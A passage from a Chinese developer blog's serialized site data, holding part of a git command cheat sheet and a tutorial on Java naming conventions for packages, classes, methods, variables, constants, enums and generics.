提交暂存区的指定文件到仓库区\n$ git commit [file1] [file2] ... -m [message]\n\n# 提交工作区自上次commit之后的变化，直接到仓库区\n$ git commit -a\n\n# 提交时显示所有diff信息\n$ git commit -v\n\n# 使用一次新的commit，替代上一次提交\n# 如果代码没有任何新变化，则用来改写上一次commit的提交信息\n$ git commit --amend -m [message]\n\n# 重做上一次commit，并包括指定文件的新变化\n$ git commit --amend [file1] [file2] ...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 五、分支\n\n# 列出所有本地分支\n$ git branch\n\n# 列出所有远程分支\n$ git branch -r\n\n# 列出所有本地分支和远程分支\n$ git branch -a\n\n# 新建一个分支，但依然停留在当前分支\n$ git branch [branch-name]\n\n# 新建一个分支，并切换到该分支\n$ git checkout -b [branch]\n\n# 新建一个分支，指向指定commit\n$ git branch [branch] [commit]\n\n# 新建一个分支，与指定的远程分支建立追踪关系\n$ git branch --track [branch] [remote-branch]\n\n# 切换到指定分支，并更新工作区\n$ git checkout [branch-name]\n\n# 切换到上一个分支\n$ git checkout -\n\n# 建立追踪关系，在现有分支与指定的远程分支之间\n$ git branch --set-upstream [branch] [remote-branch]\n\n# 合并指定分支到当前分支\n$ git merge [branch]\n\n# 选择一个commit，合并进当前分支\n$ git cherry-pick [commit]\n\n# 删除分支\n$ git branch -d [branch-name]\n\n# 删除远程分支\n$ git push origin --delete [branch-name]\n$ git branch -dr [remote/branch]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# 六、标签\n\n# 列出所有tag\n$ git tag\n\n# 新建一个tag在当前commit\n$ git tag [tag]\n\n# 新建一个tag在指定commit\n$ git tag [tag] [commit]\n\n# 删除本地tag\n$ git tag -d [tag]\n\n# 删除远程tag\n$ git push origin :refs/tags/[tagname]\n\n# 查看tag信息\n$ git show [tag]\n\n# 提交指定tag\n$ git push [remote] [tag]\n\n# 提交所有tag\n$ git push [remote] --tags\n\n# 新建一个分支，指向某个tag\n$ git checkout -b [branch] [tag]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# 七、查看信息\n\n# 显示有变更的文件\n$ git status\n\n# 显示当前分支的版本历史\n$ git log\n\n# 显示commit历史，以及每次commit发生变更的文件\n$ git log --stat\n\n# 搜索提交历史，根据关键词\n$ git log -s [keyword]\n\n# 显示某个commit之后的所有变动，每个commit占据一行\n$ git log [tag] head --pretty=format:%s\n\n# 显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件\n$ git log [tag] head --grep feature\n\n# 显示某个文件的版本历史，包括文件改名\n$ git log --follow [file]\n$ git whatchanged [file]\n\n# 显示指定文件相关的每一次diff\n$ git log -p [file]\n\n# 显示过去5次提交\n$ git log -5 --pretty --oneline\n\n# 显示所有提交过的用户，按提交次数排序\n$ git shortlog -sn\n\n# 显示指定文件是什么人在什么时间修改过\n$ git blame [file]\n\n# 显示暂存区和工作区的差异\n$ git diff\n\n# 显示暂存区和上一个commit的差异\n$ git diff --cached [file]\n\n# 显示工作区与当前分支最新commit之间的差异\n$ git diff head\n\n# 显示两次提交之间的差异\n$ git diff [first-branch]...[second-branch]\n\n# 显示今天你写了多少行代码\n$ git diff --shortstat "@{0 day ago}"\n\n# 显示某次提交的元数据和内容变化\n$ git show [commit]\n\n# 显示某次提交发生变化的文件\n$ git show --name-only [commit]\n\n# 显示某次提交时，某个文件的内容\n$ git show [commit]:[filename]\n\n# 显示当前分支的最近几次提交\n$ git reflog\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n\n# 八、远程同步\n\n# 下载远程仓库的所有变动\n$ git fetch [remote]\n\n# 显示所有远程仓库\n$ git remote -v\n\n# 显示某个远程仓库的信息\n$ git remote show [remote]\n\n# 增加一个新的远程仓库，并命名\n$ git remote add [shortname] [url]\n\n# 取回远程仓库的变化，并与本地分支合并\n$ git pull [remote] [branch]\n\n# 上传本地指定分支到远程仓库\n$ git push [remote] [branch]\n\n# 强行推送当前分支到远程仓库，即使有冲突\n$ git push [remote] --force\n\n# 推送所有分支到远程仓库\n$ git push [remote] --all\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 九、撤销\n\n# 恢复暂存区的指定文件到工作区\n$ git checkout [file]\n\n# 恢复某个commit的指定文件到暂存区和工作区\n$ git checkout [commit] [file]\n\n# 恢复暂存区的所有文件到工作区\n$ git checkout .\n\n# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变\n$ git reset [file]\n\n# 重置暂存区与工作区，与上一次commit保持一致\n$ git reset --hard\n\n# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变\n$ git reset [commit]\n\n# 重置当前分支的head为指定commit，同时重置暂存区和工作区，与指定commit一致\n$ git reset --hard [commit]\n\n# 重置当前head为指定commit，但保持暂存区和工作区不变\n$ git reset --keep [commit]\n\n# 新建一个commit，用来撤销指定commit\n# 后者的所有变化都将被前者抵消，并且应用到当前分支\n$ git revert [commit]\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 切换分支暂存未提交的commit\n\nstash 命令能够将还未 commit 的代码存起来，让你的工作目录变得干净。\n\n切换分支时先用git stash, 从另一个分支切换到本分支用git stash apply, 即可恢复代码。\n\n# 保存当前未commit的代码\ngit stash\n\n# 保存当前未commit的代码并添加备注\ngit stash save "备注的内容"\n\n# 列出stash的所有记录\ngit stash list\n\n# 删除stash的所有记录\ngit stash clear\n\n# 应用最近一次的stash\ngit stash apply\n\n# 应用最近一次的stash，随后删除该记录\ngit stash pop\n\n# 删除最近的一次stash\ngit stash drop\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 十、其他\n\n# 生成一个可供发布的压缩包\n$ git archive\n\n\n1\n2\n\n\n参考自阮一峰老师： 常用 git 命令清单',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Java 命名规范",frontmatter:{title:"Java 命名规范",date:"2021-03-02T00:00:00.000Z",tags:["开发规范","Java"],categories:["规范 Standard"],isShowComments:!0},regularPath:"/views/specification/javaNamingConvention.html",relativePath:"views/specification/javaNamingConvention.md",key:"v-2df8c2a0",path:"/views/specification/javaNamingConvention.html",headers:[{level:2,title:"1. 包命名规范",slug:"_1-包命名规范",normalizedTitle:"1. 包命名规范",charIndex:153},{level:2,title:"2. 类命名规范",slug:"_2-类命名规范",normalizedTitle:"2. 类命名规范",charIndex:165},{level:3,title:"2.1 接口命名规范",slug:"_2-1-接口命名规范",normalizedTitle:"2.1 接口命名规范",charIndex:179},{level:3,title:"2.2 抽象类命名规范",slug:"_2-2-抽象类命名规范",normalizedTitle:"2.2 抽象类命名规范",charIndex:195},{level:3,title:"2.3 异常类命名规范",slug:"_2-3-异常类命名规范",normalizedTitle:"2.3 异常类命名规范",charIndex:212},{level:2,title:"3.方法命名规范",slug:"_3-方法命名规范",normalizedTitle:"3.方法命名规范",charIndex:227},{level:3,title:"3.1 表述获取",slug:"_3-1-表述获取",normalizedTitle:"3.1 表述获取",charIndex:241},{level:3,title:"3.2 表述查询",slug:"_3-2-表述查询",normalizedTitle:"3.2 表述查询",charIndex:255},{level:3,title:"3.3 表述条件",slug:"_3-3-表述条件",normalizedTitle:"3.3 表述条件",charIndex:269},{level:3,title:"3.4 表述设置",slug:"_3-4-表述设置",normalizedTitle:"3.4 表述设置",charIndex:283},{level:3,title:"3.5 其他规范",slug:"_3-5-其他规范",normalizedTitle:"3.5 其他规范",charIndex:297},{level:2,title:"4. 变量命名规范",slug:"_4-变量命名规范",normalizedTitle:"4. 变量命名规范",charIndex:309},{level:2,title:"5. 常量命名规范",slug:"_5-常量命名规范",normalizedTitle:"5. 常量命名规范",charIndex:322},{level:2,title:"6. 枚举命名规范",slug:"_6-枚举命名规范",normalizedTitle:"6. 枚举命名规范",charIndex:335},{level:2,title:"7. 其他命名规范",slug:"_7-其他命名规范",normalizedTitle:"7. 其他命名规范",charIndex:348},{level:3,title:"7.1 数组",slug:"_7-1-数组",normalizedTitle:"7.1 数组",charIndex:363},{level:3,title:"7.2 表述复数或者集合",slug:"_7-2-表述复数或者集合",normalizedTitle:"7.2 表述复数或者集合",charIndex:375},{level:3,title:"7.3 泛型类",slug:"_7-3-泛型类",normalizedTitle:"7.3 泛型类",charIndex:393},{level:3,title:"7.4 接口实现类",slug:"_7-4-接口实现类",normalizedTitle:"7.4 接口实现类",charIndex:406},{level:3,title:"7.5 测试类和测试方法",slug:"_7-5-测试类和测试方法",normalizedTitle:"7.5 测试类和测试方法",charIndex:421},{level:2,title:"8 扩展：速记Java开发中的各种O",slug:"_8-扩展-速记java开发中的各种o",normalizedTitle:"8 扩展：速记java开发中的各种o",charIndex:437}],excerpt:"<Boxx/>\n<p>在本文中，将从大到小，从外到内，总结Java编程中的命名规范。文中将会涉及到日常工作中常见的命名示例，如包命名，类命名，接口命名，方法命名，变量命名，常类命名，抽象类命名，异常类命名以及扩展类命名等。我将按照项目工程目录结构，从包，类(接口，抽象类，异常类)，方法，变量和常量的顺序展开介绍。</p>\n",headersStr:"1. 包命名规范 2. 类命名规范 2.1 接口命名规范 2.2 抽象类命名规范 2.3 异常类命名规范 3.方法命名规范 3.1 表述获取 3.2 表述查询 3.3 表述条件 3.4 表述设置 3.5 其他规范 4. 变量命名规范 5. 常量命名规范 6. 枚举命名规范 7. 其他命名规范 7.1 数组 7.2 表述复数或者集合 7.3 泛型类 7.4 接口实现类 7.5 测试类和测试方法 8 扩展：速记Java开发中的各种O",content:'在本文中，将从大到小，从外到内，总结Java编程中的命名规范。文中将会涉及到日常工作中常见的命名示例，如包命名，类命名，接口命名，方法命名，变量命名，常类命名，抽象类命名，异常类命名以及扩展类命名等。我将按照项目工程目录结构，从包，类(接口，抽象类，异常类)，方法，变量和常量的顺序展开介绍。\n\n\n\n * 1. 包命名规范\n * 2. 类命名规范\n   * 2.1 接口命名规范\n   * 2.2 抽象类命名规范\n   * 2.3 异常类命名规范\n * 3.方法命名规范\n   * 3.1 表述获取\n   * 3.2 表述查询\n   * 3.3 表述条件\n   * 3.4 表述设置\n   * 3.5 其他规范\n * 4. 变量命名规范\n * 5. 常量命名规范\n * 6. 枚举命名规范\n * 7. 其他命名规范\n   * 7.1 数组\n   * 7.2 表述复数或者集合\n   * 7.3 泛型类\n   * 7.4 接口实现类\n   * 7.5 测试类和测试方法\n * 8 扩展：速记Java开发中的各种O\n\n\n\n\n# 1. 包命名规范\n\n包(Package)的作用是将功能相似或相关的类或者接口进行分组管理，便于类的定位和查找，同时也可以使用包来避免类名的冲突和访问控制，使代码更容易维护。通常，包命使用小写英文字母进行命名，并使用“.”进行分割，每个被分割的单元只能包含一个名词。一般地，包命名常采用顶级域名作为前缀，例如com，net，org，edu，gov，cn，io等，随后紧跟公司/组织/个人名称以及功能模块名称。下面是一些包命名示例：\n\npackage org.springframework.boot.autoconfigure.cloud\npackage org.springframework.boot.util\npackage org.hibernate.action\npackage org.hibernate.cfg\npackage com.alibaba.druid\npackage com.alibaba.druid.filter\npackage com.alibaba.nacos.client.config\npackage com.ramostear.blog.web\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n下面是Oracle Java的一些常见包命名例子：\n\npackage java.beans\npackage java.io\npackage java.lang\npackage java.net\npackage java.util\npackage javax.annotation\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2. 类命名规范\n\n类(Class)通常采用名词进行命名，且首字母大写，如果一个类名包含两个以上名词，建议使用驼峰命名(Camel-Case)法书写类名,每个名词首字母也应该大写。一般地，类名的书写尽量使其保持简单和描述的完整性，因此在书写类名时不建议使用缩写(一些约定俗成的命名除外，例如Internationalization and Localization缩写成i18n，Uniform Resource Identifier缩写成URI，Data Access Object缩写成DAO，JSON Web Token缩写成JWT，HyperText Markup Language缩写成HTML等等)。下列是一些常见的类命名示例：\n\npublic class UserDTO{\n    //TODO...\n}\nclass EmployeeService{\n    //TODO...\n}\nclass StudentDAO{\n    //TODO...\n}\nclass OrderItemEntity{\n    //TODO...\n}\npublic class UserServiceImpl{\n    //TODO...\n}\npublic class OrderItemController{\n    //TODO...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n下面是Oracle Java中的一些标准命名示例：\n\npublic class HTMLEditorKit{\n    //...\n}\npublic abstract class HttpContext{\n    //...\n}\npublic interface ImageObserver{\n    //...\n}\npublic class ArrayIndexOutOfBoundsException{\n    //...\n}\npublic class enum Thread.State{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 2.1 接口命名规范\n\n首先，接口(Interface)是一种表述某一类型对象动作的特殊类；简单来说，接口也是类(不太严谨)，所以，接口的名称的书写也应该符合类名书写规范，首字母应该大写，与普通类名不同的是，接口命名时通常采用形容词或动词来描述接口的动作行为。下列是Oracle Java中一些标准库的接口使用形容词命名示例：\n\npublic interface Closeable{\n    //...\n}\npublic interface Cloneable{\n    //...\n}\npublic interface Runnable{\n    //...\n}\npublic interface Comparable<T>{\n    //...\n}\npublic interface CompletionService<V>{\n    //...\n}\npublic interface Iterable<T>{\n    //...\n}\npublic interface EventListener{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n在Spring Framework标准库中，通常采用名词+动词/形容词的组合方式来命名接口，下列是Spring Framework中一些接口命名示例：\n\npublic interface AfterAdvice{\n    //...\n}\npublic interface TargetClassAware{\n    //...\n}\npublic interface ApplicationContextAware{\n    //...\n}\npublic interface MessageSourceResolvable{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 2.2 抽象类命名规范\n\n抽象类(Abstract Class)是一种特殊的类，其命名与普通类的命名规范相当。一般地，为了将抽象类与普通类和接口做出区别，提高抽象类的可读性，在命名抽象类时，会以“Abstract”/“Base”作为类命的前缀。下面是编程中一些常规的命名示例：\n\npublic abstract class AbstractRepository<T>{\n    //...\n}\npublic abstract class AbstractController{\n    //...\n}\npublic abstract class BaseDao<T,ID>{\n    //...\n}\npublic abstract class AbstractCommonService<T>{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n以下是Spring Framework中常见的抽象类示例：\n\npublic abstract class AbstractAspectJAdvice{\n    //...\n}\npublic abstract class AbstractSingletonProxyFactoryBean{\n    //...\n}\npublic abstract class AbstractBeanFactoryPointcutAdvisor{\n    //...\n}\npublic abstract class AbstractCachingConfiguration{\n    //...\n}\npublic abstract class AbstractContextLoaderInitializer{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 2.3 异常类命名规范\n\n异常类(Exception Class)也是类的一种，但与普通类命名不同的是，异常类在命名时需要使用“Exception”作为其后缀。下面是常见的异常类命名示例：\n\npublic class FileNotFoundException{\n    //...\n}\npublic class UserAlreadyExistException{\n    //...\n}\npublic class TransactionException{\n    //...\n}\npublic class ClassNotFoundException{\n    //...\n}\npublic class IllegalArgumentException{\n    //...\n}\npublic class IndexOutOfBoundsException{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n另外，在Java中还有另外一类异常类，它们属于系统异常，这一类异常类的命名使用“Error”作为其后缀，以区分Exception(编码，环境，操作等异常)。下面是系统异常(非检查异常)的命名示例：\n\npublic abstract class VirtualMachineError{\n    //...\n}\npublic class StackOverflowError{\n    //...\n}\npublic class OutOfMemoryError{\n    //...\n}\npublic class IllegalAccessError{\n    //...\n}\npublic class NoClassDefFoundError{\n    //...\n}\npublic class NoSuchFieldError{\n    //...\n}\npublic class NoSuchMethodError{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 3.方法命名规范\n\n方法(Method)命名时,其首字母应该小写，如果方法签名由多个单词组成，则从第二个单词起，使用驼峰命名法进行书写。一般地，在对方法进行命名时，通常采用动词/动词+名词的组合，下面是方法命名的一些常见示例。\n\n\n# 3.1 表述获取\n\n如果一个方法用于获取某个值，通常使用“get”作为其前缀，例如：\n\npublic String getUserName(){\n    //...\n}\npublic List<Integer> getUserIds(){\n    //...\n}\npublic User getOne(){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 3.2 表述查询\n\n如果方法需要通过查询或筛选的方式获取某个数据，通常使用“find”/“query”作为其前缀，例如：\n\npublic List<User> findOne(Integer id){\n    //...\n}\npublic List<Integer> findAll(){\n    //...\n} \npublic List<String> queryOrders(){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 3.3 表述条件\n\n如果一个方法需要一些条件参数，则可以使用“by”/“with”等字符作为方法名中条件的连接符，例如：\n\npublic User findByUsername(String username){\n    //...\n}\npublic List<Integer> getUserIdsWithState(boolean state){\n    //...\n}\npublic List<User> findAllByUsernameOrderByIdDesc(String username){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 3.4 表述设置\n\n如果一个方法是要设置，插入，修改，删除等操作，应该将对应的动词(set,insert,update,delete)作为其名词的前缀，例如：\n\npublic void setName(String name){\n    //...\n}\npublic User insert(User user){\n    //...\n}\npublic void update(User user){\n    //...\n}\npublic void clearAll(){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 3.5 其他规范\n\n如果一个方法用于获取某组数据的长度或数量，则该方法应该使用length或size命名；如果方法的返回值为布尔类型(Boolean)，则该方法应该使用“is”或”has”作为前缀；如果方法用于将一种类型的数据转换为另一种数据数类型，则可以使用“to”作为前缀。下面是综合示例：\n\npublic long length(){\n    //...\n}\npublic int size(){\n    //...\n}\npublic boolean isOpen(){\n    //...\n}\npublic boolean isNotEmpty(){\n    //...\n}\npublic boolean hasLength(){\n    //...\n}\npublic Set<Integer> mapToSet(Map map){\n    //...\n}\npublic UserDto convertTo(User user){\n    //...\n}\npublic String toString(Object obj){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 4. 变量命名规范\n\n变量(Variable)命名包括参数名称，成员变量和局部变量。变量命名通常以小写字母开头，如果变量名由多个单词构成，则从第二个单词起首字母需要大写，在变量命名过程中，不建议使用“_”作为前缀或者单词之间的分割符号。下面是一些常见的变量命名示例：\n\nprivate String nickName;\nprivate String mobileNumber;\nprivate Long id;\nprivate String username;\nprivate Long orderId;\nprivate Long orderItemId;\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 5. 常量命名规范\n\n一般地，常量名称采用全部大写的英文单词书写，如果常量名称由多个单词组成，则单词之间统一使用“_”进行分割，下面是常量命名示例：\n\npublic static final String LOGIN_USER_SESSION_KEY = "current_login_user";\npublic static final int MAX_AGE_VALUE = 120;\npublic static final int DEFAULT_PAGE_NO = 1;\npublic static final long MAX_PAGE_SIZE = 1000;\npublic static final boolean HAS_LICENSE = false;\npublic static final boolean IS_CHECKED = false;\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 6. 枚举命名规范\n\n枚举(Enum)类是一种特殊的类，其命名规范遵循普通类的命名约束条件，首字母大写，采用驼峰命名法；枚举类中定义的值的名称遵循常量的命名规范，且枚举值的名称需要与类名有一定的关联性，下面是枚举的一些示例：\n\npublic enum Color{\n    RED,YELLOW,BLUE,GREEN,WHITE;\n}\npublic enum PhysicalSize{\n    TINY,SMALL,MEDIUM,LARGE,HUGE,GIGANTIC;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n下面是Oracle Java标准库中的一个示例：\n\npublic enum ElementType{\n    TYPE,\n    FIELD,\n    METHOD,\n    PARAMETER,\n    CONSTRUCTOR,\n    LOCAL_VARIABLE,\n    ANNOTATION_TYPE,\n    PACKAGE,\n    TYPE_PARAMETER,\n    TYPE_USE;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 7. 其他命名规范\n\n\n# 7.1 数组\n\n在定义数组时，为了便于阅读，尽量保持以下的书写规范：\n\nint[] array = new int[10];\nint[] idArray ={1,2,3,4,5};\nString[] nameArray = {"First","Yellow","Big"}\n\npublic List<String> getNameById(Integer[] ids){\n    //...\n}\n//或者\npublic List<String> getNameById(Integer...ids){\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 7.2 表述复数或者集合\n\n如果一个变量用于描述多个数据时，尽量使用单词的复数形式进行书写，例如：\n\nCollection<Order> orders;\nint[] values;\nList<Item> items;\n\n\n1\n2\n3\n\n\n另外，如果表述的是一个Map数据，则应使用“map”作为其后缀，例如：\n\nMap<String,User> userMap;\nMap<String,List<Object>> listMap;\n\n\n1\n2\n\n\n\n# 7.3 泛型类\n\n在书写泛型类时，通常做以下的约定：\n\n * E表示Element，通常用在集合中；\n * ID用于表示对象的唯一标识符类型\n * T表示Type(类型)，通常指代类；\n * K表示Key(键),通常用于Map中；\n * V表示Value(值),通常用于Map中，与K结对出现；\n * N表示Number,通常用于表示数值类型；\n * ？表示不确定的Java类型；\n * X用于表示异常；\n * U,S表示任意的类型。\n\n下面时泛型类的书写示例：\n\npublic class HashSet<E> extends AbstractSet<E>{\n    //...\n}\npublic class HashMap<K,V> extends AbstractMap<K,V>{\n    //...\n}\npublic class ThreadLocal<T>{\n    //...\n}\npublic interface Functor<T,X extends Throwable>{\n    T val() throws X;\n}\npublic class Container<K,V>{\n    private K key;\n    private V value;\n    Container(K key,V value){\n        this.key = key;\n        this.value = value;\n    }\n    //getter and setter ...\n}\n\npublic interface BaseRepository<T,ID>{\n    T findById(ID id);\n\n    void update(T t);\n\n    List<T> findByIds(ID...ids);\n}\n\npublic static <T> List<T> methodName(Class<T> clz){\n    List<T> dataList = getByClz(clz);\n    return dataList;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 7.4 接口实现类\n\n为了便于阅读，在通常情况下，建议接口实现类使用“Impl作为后缀”，不建议使用大写的“I”作为接口前缀，下面是接口和接口实现类的书写示例。\n\n推荐写法：\n\npublic interface OrderService{\n    //...\n}\npublic class OrderServiceImpl implements OrderService{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n不建议的写法：\n\npublic interface IOrderService{\n    //...\n}\npublic class OrderService implements IOrderService{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 7.5 测试类和测试方法\n\n在项目中，测试类采用被测试业务模块名/被测试接口/被测试类+“Test”的方法进行书写，测试类中的测试函数采用“test”+用例操作_状态的组合方式进行书写，例如：\n\npublic class UserServiceTest{\n\n    public void testFindByUsernameAndPassword(){\n        //...\n    }\n\n    public void testUsernameExist_notExist(){\n        //...\n    }\n\n    public void testDeleteById_isOk(){\n        //...\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 8 扩展：速记Java开发中的各种O\n\n最后，通过一张表和图快速对Java中的BO,DTO,DAO,PO,POJO,VO之间的含义，区别以及联系进行梳理。\n\n名称     使用范围                                  解释说明\nBO     用于Service,Manager,Business等业务相关类的命名   Business Object业务处理对象，主要作用是把业务逻辑封装成一个对象。\nDTO    经过加工后的PO对象，其内部属性可能增加或减少               Data Transfer\n                                             Object数据传输对象，主要用于远程调用等需要大量传输数据的地方，例如，可以将一个或多个PO类的部分或全部属性封装为DTO进行传输\nDAO    用于对数据库进行读写操作的类进行命名                    Data Access\n                                             Object数据访问对象，主要用来封装对数据库的访问，通过DAO可以将POJO持久化为PO，也可以利用PO封装出VO和DTO\nPO     Bean,Entity等类的命名                      Persistant\n                                             Object持久化对象，数据库表中的数据在Java对象中的映射状态，可以简单的理解为一个PO对象即为数据库表中的一条记录\nPOJO   POJO是DO/DTO/BO/VO的统称                  Plain Ordinary Java Object\n                                             简单Java对象，它是一个简单的普通Java对象，禁止将类命名为XxxxPOJO\nVO     通常是视图控制层和模板引擎之间传递的数据对象                Value Object\n                                             值对象，主要用于视图层，视图控制器将视图层所需的属性封装成一个对象，然后用一个VO对象在视图控制器和视图之间进行数据传输。\nAO     应用层对象                                 Application Object，在Web层与Service层之间抽象的复用对象模型，很少用。\n\n下面将通过一张图来理解上述几种O之间相互转换的关系：\n\n\n\n来源：https://www.ramostear.com/blog/2020/03/20/2vxdaqjq.html',normalizedContent:'在本文中，将从大到小，从外到内，总结java编程中的命名规范。文中将会涉及到日常工作中常见的命名示例，如包命名，类命名，接口命名，方法命名，变量命名，常类命名，抽象类命名，异常类命名以及扩展类命名等。我将按照项目工程目录结构，从包，类(接口，抽象类，异常类)，方法，变量和常量的顺序展开介绍。\n\n\n\n * 1. 包命名规范\n * 2. 类命名规范\n   * 2.1 接口命名规范\n   * 2.2 抽象类命名规范\n   * 2.3 异常类命名规范\n * 3.方法命名规范\n   * 3.1 表述获取\n   * 3.2 表述查询\n   * 3.3 表述条件\n   * 3.4 表述设置\n   * 3.5 其他规范\n * 4. 变量命名规范\n * 5. 常量命名规范\n * 6. 枚举命名规范\n * 7. 其他命名规范\n   * 7.1 数组\n   * 7.2 表述复数或者集合\n   * 7.3 泛型类\n   * 7.4 接口实现类\n   * 7.5 测试类和测试方法\n * 8 扩展：速记java开发中的各种o\n\n\n\n\n# 1. 包命名规范\n\n包(package)的作用是将功能相似或相关的类或者接口进行分组管理，便于类的定位和查找，同时也可以使用包来避免类名的冲突和访问控制，使代码更容易维护。通常，包命使用小写英文字母进行命名，并使用“.”进行分割，每个被分割的单元只能包含一个名词。一般地，包命名常采用顶级域名作为前缀，例如com，net，org，edu，gov，cn，io等，随后紧跟公司/组织/个人名称以及功能模块名称。下面是一些包命名示例：\n\npackage org.springframework.boot.autoconfigure.cloud\npackage org.springframework.boot.util\npackage org.hibernate.action\npackage org.hibernate.cfg\npackage com.alibaba.druid\npackage com.alibaba.druid.filter\npackage com.alibaba.nacos.client.config\npackage com.ramostear.blog.web\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n下面是oracle java的一些常见包命名例子：\n\npackage java.beans\npackage java.io\npackage java.lang\npackage java.net\npackage java.util\npackage javax.annotation\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2. 类命名规范\n\n类(class)通常采用名词进行命名，且首字母大写，如果一个类名包含两个以上名词，建议使用驼峰命名(camel-case)法书写类名,每个名词首字母也应该大写。一般地，类名的书写尽量使其保持简单和描述的完整性，因此在书写类名时不建议使用缩写(一些约定俗成的命名除外，例如internationalization and localization缩写成i18n，uniform resource identifier缩写成uri，data access object缩写成dao，json web token缩写成jwt，hypertext markup language缩写成html等等)。下列是一些常见的类命名示例：\n\npublic class userdto{\n    //todo...\n}\nclass employeeservice{\n    //todo...\n}\nclass studentdao{\n    //todo...\n}\nclass orderitementity{\n    //todo...\n}\npublic class userserviceimpl{\n    //todo...\n}\npublic class orderitemcontroller{\n    //todo...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n下面是oracle java中的一些标准命名示例：\n\npublic class htmleditorkit{\n    //...\n}\npublic abstract class httpcontext{\n    //...\n}\npublic interface imageobserver{\n    //...\n}\npublic class arrayindexoutofboundsexception{\n    //...\n}\npublic class enum thread.state{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 2.1 接口命名规范\n\n首先，接口(interface)是一种表述某一类型对象动作的特殊类；简单来说，接口也是类(不太严谨)，所以，接口的名称的书写也应该符合类名书写规范，首字母应该大写，与普通类名不同的是，接口命名时通常采用形容词或动词来描述接口的动作行为。下列是oracle java中一些标准库的接口使用形容词命名示例：\n\npublic interface closeable{\n    //...\n}\npublic interface cloneable{\n    //...\n}\npublic interface runnable{\n    //...\n}\npublic interface comparable<t>{\n    //...\n}\npublic interface completionservice<v>{\n    //...\n}\npublic interface iterable<t>{\n    //...\n}\npublic interface eventlistener{\n    //...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n在spring framework标准库中，通常采用名词+动词/形容词的组合方式来命名接口，下列是spring framework中一些接口命名示例：\n\npublic interface afteradvice{\n    